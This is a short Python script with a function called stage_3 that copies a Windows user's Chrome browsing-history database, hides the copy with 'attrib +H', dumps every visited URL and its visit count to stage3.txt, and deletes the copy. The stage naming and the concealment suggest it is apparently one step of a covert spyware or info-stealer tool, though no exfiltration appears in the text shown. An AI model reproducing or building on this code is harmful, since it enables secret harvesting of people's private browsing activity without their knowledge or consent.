from os import getenv
import os
import sqlite3
import subprocess
import shutil
import time

def stage_3():
	filename = "stage3.txt"
	myfile = open(filename, 'w')

	shutil.copy(getenv("APPDATA") + r"\..\Local\Google\Chrome\User Data\Default\History", 'history.db')
	subprocess.check_call(["attrib","+H","history.db"])
	con = sqlite3.connect('history.db')
	c = con.cursor()
	c.execute("select url, title, visit_count, last_visit_time from urls")
	results = c.fetchall()
	for r in results:
		try:
			url = r[0]
			visits = r[2]
			myfile.write("{: <70}".format(url) + "{: <70}".format(visits) +"\n")
		except: pass

	myfile.close()
	con.close()
	os.remove('history.db')